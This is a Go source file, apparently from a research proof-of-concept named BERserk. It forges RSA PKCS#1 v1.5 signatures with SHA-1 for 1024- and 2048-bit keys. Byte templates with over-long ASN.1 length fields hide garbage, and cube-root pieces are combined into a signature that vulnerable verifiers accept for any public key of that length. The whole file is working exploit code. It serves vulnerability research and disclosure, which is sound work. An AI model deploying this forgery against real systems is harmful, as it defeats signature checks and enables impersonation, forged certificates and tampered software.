package BERserk

import (
	"crypto"
	"errors"
)

type DigestInfoTemplate struct {
	Prefix, Middle, Suffix        []byte
	BitLen, MiddleOffset, HashLen int
}

var (
	RSA1024SHA1DigestInfoTemplate = &DigestInfoTemplate{
		BitLen: 1024,
		Prefix: []byte{
			0x00, 0x01, 0xFF, 0x00, // PKCS#1 padding
			0x30, // Tag: SEQUENCE
			0xD9, // Multi-byte len (0x80 + 0x59)
		},
		// ... 0x55 (0xD9 - 0x80 - 4) bytes of garbage ...
		Suffix: []byte{
			0x00, 0x00, 0x00, 0x21, // Actual parsed value of multi-byte len
			0x30, 0x09, // Tag: SEQUENCE, length: 9
			0x06, 0x05, // Tag: OID, length: 5
			0x2B, 0x0E, 0x03, 0x02, 0x1A, // SHA1
			0x05, 0x00, // Tag: NULL, length: 0
			0x04, 0x14, // Tag: OCTET STRING, length: 20
		},
		HashLen: 20,
	}
	RSA2048SHA1DigestInfoTemplate = &DigestInfoTemplate{
		BitLen: 2048,
		Prefix: []byte{
			0x00, 0x01, 0x00, // PKCS#1 padding
			0x30, // Tag: SEQUENCE
			0xDB, // Multi-byte len (0x80 + 0x5B)
		},
		// ... 0x57 (0xDB - 0x80 - 4) bytes of garbage ...
		Middle: []byte{
			0x00, 0x00, 0x00, 0xA0, // Actual parsed value of multi-byte len
			0x30, // Tag: SEQUENCE
			0xFF, // Multi-byte len (0x80 + 0x7F)
		},
		MiddleOffset: 123, // ... 0x7B (0xFF - 0x80 - 4) bytes of garbage ...
		Suffix: []byte{
			0x00, 0x00, 0x00, 0x09, // Actual parsed value of multi-byte len
			0x06, 0x05, // Tag: OID, length: 5
			0x2B, 0x0E, 0x03, 0x02, 0x1A, // SHA1
			0x05, 0x00, // Tag: NULL, length: 0
			0x04, 0x14, // Tag: OCTET STRING, length: 20
		},
		HashLen: 20,
	}
)

// SignPKCS1v15 is the core generic implementation of BERserk. It will generate
// a signature of hashed that will look valid for any RSA public key of the
// given length (to implementations vulnerable to BERserk).
//
// ErrRetry is returned when a signature can't be generated for the specific
// input. Change the message and retry.
//
// bitLen is the length of the public key, only 1024 and 2048 are supported.
// hash is the function applied to the message to get hashed.
// Only hash == crypto.SHA1 is supported.
func SignPKCS1v15(bitLen int, hash crypto.Hash, hashed []byte) (s []byte, err error) {
	var template *DigestInfoTemplate
	switch {
	case hash == crypto.SHA1 && bitLen == 1024:
		template = RSA1024SHA1DigestInfoTemplate
	case hash == crypto.SHA1 && bitLen == 2048:
		template = RSA2048SHA1DigestInfoTemplate
	default:
		return nil, errors.New("unsupported hash / keyLen combination")
	}

	if template.HashLen != len(hashed) {
		return nil, errors.New("wrong hash length")
	}

	targetSuffix := append(template.Suffix, hashed...)
	sigLow, err := CubeRootSuffix(targetSuffix)
	if err != nil {
		return nil, err
	}

	sigHi, err := CubeRootPrefix(template.Prefix, template.BitLen)
	if err != nil {
		return nil, err
	}

	var m []byte
	if template == RSA2048SHA1DigestInfoTemplate {
		m, err = RSA2048SHA1Middle(sigHi, sigLow, template.Middle,
			template.MiddleOffset+len(template.Suffix)+template.HashLen)
		if err != nil {
			return nil, err
		}
	}

	result := make([]byte, template.BitLen/8)
	for i := 1; i <= len(result); i++ {
		if i <= len(sigHi) {
			result[len(result)-i] |= sigHi[len(sigHi)-i]
		}
		if i <= len(sigLow) {
			result[len(result)-i] |= sigLow[len(sigLow)-i]
		}
		if i <= len(m) {
			result[len(result)-i] |= m[len(m)-i]
		}
	}

	return result, nil
}
